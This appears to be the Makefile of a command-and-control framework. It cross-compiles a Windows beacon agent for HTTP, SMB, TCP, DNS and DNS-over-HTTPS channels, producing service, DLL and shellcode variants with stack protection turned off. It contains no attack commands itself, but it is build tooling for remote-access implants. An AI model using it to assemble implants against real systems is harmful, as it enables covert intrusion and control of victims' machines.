SOURCES := $(wildcard beacon/*.cpp)

BEACON_DIR := "beacon"
FILES_DIR := "files"
HTTP_DIST_DIR := "objects_http"
SMB_DIST_DIR := "objects_smb"
TCP_DIST_DIR := "objects_tcp"
DNS_DIST_DIR := "objects_dns"
DOH_DIST_DIR := "objects_doh"
DNS_DOH_DIST_DIR := "objects_dns_doh"

HTTP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x64.o, $(SOURCES))
HTTP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x86.o, $(SOURCES))

SMB_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x64.o, $(SOURCES))
SMB_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x86.o, $(SOURCES))

TCP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x64.o, $(SOURCES))
TCP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x86.o, $(SOURCES))

DNS_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x64.o, $(SOURCES))
DNS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x86.o, $(SOURCES))

DOH_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DOH_DIST_DIR)/%.x64.o, $(SOURCES))
DOH_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DOH_DIST_DIR)/%.x86.o, $(SOURCES))

DNS_DOH_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DNS_DOH_DIST_DIR)/%.x64.o, $(SOURCES))
DNS_DOH_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DOH_DIST_DIR)/%.x86.o, $(SOURCES))

SECURITY_FLAGS := -fno-stack-protector \
                 -fno-strict-overflow \
                 -fno-delete-null-pointer-checks \
                 -fno-strict-aliasing \
                 -fno-builtin

OPTIMIZATION_FLAGS := -fno-exceptions \
                     -fno-unwind-tables \
                     -fno-asynchronous-unwind-tables

COMMON_FLAGS := -I $(BEACON_DIR) \
                -fpermissive \
                -w \
                -masm=intel \
                -fPIC \
                $(SECURITY_FLAGS) \
                $(OPTIMIZATION_FLAGS)

.PHONY: all clean pre x64 x86

# Cross-platform CPU core detection
# nproc for Linux, sysctl for macOS, default to 1 if both fail
NPROC := $(shell nproc 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 1)

ifeq ($(MAKELEVEL), 0)
    MAKEFLAGS += -j$(NPROC) --no-print-directory
endif

all: clean pre x64 x86
	@ # http
	@ cp $(FILES_DIR)/config.tpl $(HTTP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(HTTP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(HTTP_DIST_DIR)/stub.x86.bin
	@ # smb
	@ cp $(FILES_DIR)/config.tpl $(SMB_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(SMB_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(SMB_DIST_DIR)/stub.x86.bin
	@ # tcp
	@ cp $(FILES_DIR)/config.tpl $(TCP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(TCP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(TCP_DIST_DIR)/stub.x86.bin
	@ # dns
	@ cp $(FILES_DIR)/config.tpl $(DNS_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(DNS_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(DNS_DIST_DIR)/stub.x86.bin
	@ # doh
	@ cp $(FILES_DIR)/config.tpl $(DOH_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(DOH_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(DOH_DIST_DIR)/stub.x86.bin

clean:
	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR) $(DNS_DOH_DIST_DIR)
	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR) $(DOH_DIST_DIR) $(DNS_DOH_DIST_DIR)

x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64) $(DOH_OBJECTS_X64) $(DNS_DOH_OBJECTS_X64)
	@ # http
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x64.o
	@rm $(HTTP_DIST_DIR)/ConnectorSMB.x64.o $(HTTP_DIST_DIR)/ConnectorTCP.x64.o
	@ # smb
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x64.o
	@rm $(SMB_DIST_DIR)/ConnectorHTTP.x64.o $(SMB_DIST_DIR)/ConnectorTCP.x64.o
	@ # tcp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x64.o $(TCP_DIST_DIR)/ConnectorSMB.x64.o
	@ # dns
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x64.o $(DNS_DIST_DIR)/ConnectorSMB.x64.o $(DNS_DIST_DIR)/ConnectorTCP.x64.o
	@ # doh
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SVC -o $(DOH_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DOH -D BUILD_DLL -o $(DOH_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SHELLCODE -o $(DOH_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(DOH_DIST_DIR)/ConnectorHTTP.x64.o $(DOH_DIST_DIR)/ConnectorSMB.x64.o $(DOH_DIST_DIR)/ConnectorTCP.x64.o $(DOH_DIST_DIR)/ConnectorDNS.x64.o
	@ # dns_doh
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SVC -o $(DNS_DOH_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS_DOH -D BUILD_DLL -o $(DNS_DOH_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SHELLCODE -o $(DNS_DOH_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(DNS_DOH_DIST_DIR)/ConnectorHTTP.x64.o $(DNS_DOH_DIST_DIR)/ConnectorSMB.x64.o $(DNS_DOH_DIST_DIR)/ConnectorTCP.x64.o

x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86) $(DOH_OBJECTS_X86) $(DNS_DOH_OBJECTS_X86)
	@ # http
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(HTTP_DIST_DIR)/ConnectorSMB.x86.o $(HTTP_DIST_DIR)/ConnectorTCP.x86.o
	@ # smb
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(SMB_DIST_DIR)/ConnectorHTTP.x86.o $(SMB_DIST_DIR)/ConnectorTCP.x86.o
	@ # tcp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x86.o $(TCP_DIST_DIR)/ConnectorSMB.x86.o
	@ # dns
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DIST_DIR)/ConnectorTCP.x86.o
	@ # doh
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SVC -o $(DOH_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DOH -D BUILD_DLL -o $(DOH_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DOH -D BUILD_SHELLCODE -o $(DOH_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(DOH_DIST_DIR)/ConnectorHTTP.x86.o $(DOH_DIST_DIR)/ConnectorSMB.x86.o $(DOH_DIST_DIR)/ConnectorTCP.x86.o $(DOH_DIST_DIR)/ConnectorDNS.x86.o
	@ # dns_doh
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SVC -o $(DNS_DOH_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS_DOH -D BUILD_DLL -o $(DNS_DOH_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS_DOH -D BUILD_SHELLCODE -o $(DNS_DOH_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(DNS_DOH_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DOH_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DOH_DIST_DIR)/ConnectorTCP.x86.o



$(HTTP_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@

$(HTTP_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@



$(SMB_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@

$(SMB_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@



$(TCP_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@

$(TCP_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@



$(DNS_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@

$(DNS_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@

$(DOH_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DOH -c $< -o $@

$(DOH_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DOH -c $< -o $@

$(DNS_DOH_DIST_DIR)/%.x64.o: beacon/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS_DOH -c $< -o $@

$(DNS_DOH_DIST_DIR)/%.x86.o: beacon/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_DNS_DOH -c $< -o $@
